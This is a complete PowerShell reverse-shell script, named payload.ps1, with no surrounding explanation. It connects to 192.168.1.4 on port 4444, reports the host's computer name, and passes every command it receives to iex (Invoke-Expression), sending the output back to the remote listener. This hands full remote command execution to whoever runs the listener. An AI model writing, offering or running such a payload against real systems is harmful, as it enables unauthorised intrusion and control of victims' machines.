# payload.ps1 - Simple reverse shell
$ip = "192.168.1.4"  # ← yes
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$bytes = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

$writer.WriteLine("Connected from: $env:COMPUTERNAME")
$writer.WriteLine("PS $($pwd.Path)> ")
$writer.Flush()

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = $encoding.GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS $($pwd.Path)> "
    $sendbyte = $encoding.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
